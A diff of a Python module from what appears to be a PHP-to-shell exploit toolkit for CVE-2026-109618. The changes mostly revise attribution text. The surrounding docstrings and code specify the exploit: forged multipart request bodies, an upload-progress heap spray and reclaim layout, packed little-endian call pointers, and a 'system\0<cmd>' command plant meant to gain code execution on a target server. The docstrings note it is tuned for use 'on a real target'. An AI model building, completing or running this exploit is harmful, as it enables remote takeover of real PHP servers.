@@ -1,8 +1,14 @@
 #!/usr/bin/env python3
 """Module "COMPACT": rearm/re-grab body + final forged multipart (compact tail).
 
-RECONSTRUCTED from zer061 shape docs + LEAK module spec; NOT the author's original;
-per-build semantics marked VERIFIED (mined docs) / INFERRED.
+Reconstructed from published shape notes for CVE-2026-109618 attributed to
+Zer061 / PHP-UP-2026, plus the local LEAK module spec. The original repository
+has been removed; the snapshot consulted is
+https://web.archive.org/web/20261021082048/http://github.com/Zer061/CVE-2026-109618/.
+This file contains no verbatim upstream code and is not a copy of the author's
+original release; per-build semantics are marked VERIFIED (mined notes) /
+INFERRED. No license is asserted for the upstream notes. See
+THIRD_PARTY_NOTICES.md.
 
 Consumed by php2shell.py attempt():
   COMPACT.BOUNDARY              Content-Type boundary of the rearm and final
@@ -23,7 +29,7 @@ Consumed by php2shell.py attempt():
                                 final_parts=116 (php2shell.py:265).
 
 Per-semantics provenance
-VERIFIED (mined docs, zer061 bundle + LEAK module + freeze_battery):
+VERIFIED (mined notes, Zer061 bundle + LEAK module + freeze_battery):
   - Part grammar: --B CRLF / Content-Disposition: form-data; name="x"
     [; filename="y"] CRLF CRLF value (+ each caller appends CRLF)
     (poc0_109618.py:56-60, poc1_109619.py:48-52, php_up_framework.py:90-94);
@@ -43,7 +49,7 @@ VERIFIED (mined docs, zer061 bundle + LEAK module + freeze_battery):
     pack the call pointer at fixed record offsets; never ASCII hex strings; the
     record is then REPEATED into every reclaim part (repeater-per-part choice).
     The compact final mirrors the raw-LE choice, and mixes ASCII command bytes
-    with packed pointers exactly like zero61's "system\\0<cmd>" plant
+    with packed pointers exactly like Zer061's "system\\0<cmd>" plant
     (offset 200, poc0_109618.py:51-52).
   - Upload-progress machinery needs the USP field; the LEAK probe keeps TWO file
     parts with F*39 filenames (native-output-leak.py:47-52); the (n2, f1, f2)
@@ -62,7 +68,7 @@ VERIFIED (mined docs, zer061 bundle + LEAK module + freeze_battery):
 
 INFERRED (choices with no direct doc statement; kept explicit for A/B on a
 real target, see also the TODO list in the final reconstruction report):
-  - BOUNDARY value b"B7kQcompact": pattern of the zero61 family
+  - BOUNDARY value b"B7kQcompact": pattern of the Zer061 family
     b"B7kQpoc618"/b"B7kQpoc619" (poc0_109618.py:64, poc1_109619.py:56).
   - ARM_FILENAME_LENGTH = 262144 == the LEAK stock-arm default
     --large-filename-length (native-output-leak.py:171); 20 such parts stay
@@ -70,7 +76,7 @@ real target, see also the TODO list in the final reconstruction report):
   - arm_body: file parts capped at 20 (min(parts, MAX_FILE_UPLOADS)); the
     requested remainder (149-20 = 129 at the driver call) becomes t[] filler
     FIELD parts so the reclaim wing (file parts + t[] fillers) equals `parts`
-    while no upload state is consumed (this maps the zero61 "149 t[]" reclaim
+    while no upload state is consumed (this maps the Zer061 "149 t[]" reclaim
     grammar onto the measured max_file_uploads=20 cap). Interior part total at
     the driver call = reclaim wing (149) + the USP field = 150.
   - arm_body USP value b"MMM" (the LEAK stock-arm value); rearm ordering
@@ -85,7 +91,7 @@ real target, see also the TODO list in the final reconstruction report):
   - probe_body forged pointers are planted one raw-LE u64 t[] field each
     (target, then dso_base, then stage_delta), positioned directly after the
     filler section and before the ordinal/payload tail, rather than one
-    288-byte record repeated everywhere (zero61's repeater). The raw-LE
+    288-byte record repeated everywhere (Zer061's repeater). The raw-LE
     encoding is the mirrored choice; the one-field-per-pointer spread is
     INFERRED.
   - b2 toggles an extra t[] spray wave (parts entries); the driver call has
@@ -111,7 +117,7 @@ MAX_FILE_UPLOADS = 20        # measured max_file_uploads cap on the lab stack
 POST_MAX_SIZE = 8 * 1024 * 1024  # measured; body > 8M aborts pre-machinery
 
 _U64 = 0xFFFFFFFFFFFFFFFF
-_MARKER = b"\r\n--" + BOUNDARY + b"\r\n"  # zero61-style collision tripwire
+_MARKER = b"\r\n--" + BOUNDARY + b"\r\n"  # Zer061-style collision tripwire
 
 
 def field(name: bytes, value: bytes) -> bytes:
@@ -133,7 +139,7 @@ def file_part(index: int, filename: bytes) -> bytes:
 
 
 def _u64(value: int) -> bytes:
-    """Raw little-endian u64, the zero61 forge() pointer encoding."""
+    """Raw little-endian u64, the Zer061 forge() pointer encoding."""
     return struct.pack("<Q", value & _U64)
 
 
@@ -141,11 +147,11 @@ def arm_body(no_close_flag: bool, filename_length: int, parts: int) -> bytes:
     """Rearm / re-grab multipart (multipart only).
 
     parts is the requested count of the RECLAIM WING (file parts + t[] filler
-    fields), echoed from zero61's N149 grammar ("149 t[] parts are the packed
+    fields), echoed from Zer061's N149 grammar ("149 t[] parts are the packed
     natural table"). File parts are capped at MAX_FILE_UPLOADS (20, measured
     max_file_uploads: beyond the cap parts are parsed but never uploaded);
     every remaining entry up to `parts` is represented as a t[] filler FIELD
-    part (zero61 reclaim grammar). Interior part total = parts + 1 (USP field).
+    part (Zer061 reclaim grammar). Interior part total = parts + 1 (USP field).
 
     Shape at the driver call (False, 262144, 149):
       1 x PHP_SESSION_UPLOAD_PROGRESS field  (value b"MMM")   [INFERRED value]
@@ -184,7 +190,7 @@ def probe_body(parts: int, f1: int, f2: int, field_len: int, b1: bool, n2: int,
       [b2]   optional t[] spray wave (parts entries, value b"T"); OFF in the
              driver call (b2=False)
       [always] FORGED-POINTER FIELD BLOCK, the three values packed raw
-             little-endian u64 (mirrored zero61 forge() encoding), one t[]
+             little-endian u64 (mirrored Zer061 forge() encoding), one t[]
              field per value, in order: target, dso_base, stage_delta.
              ORDER IN BYTES: immediately after the filler section, before the
              ordinal/payload tail:
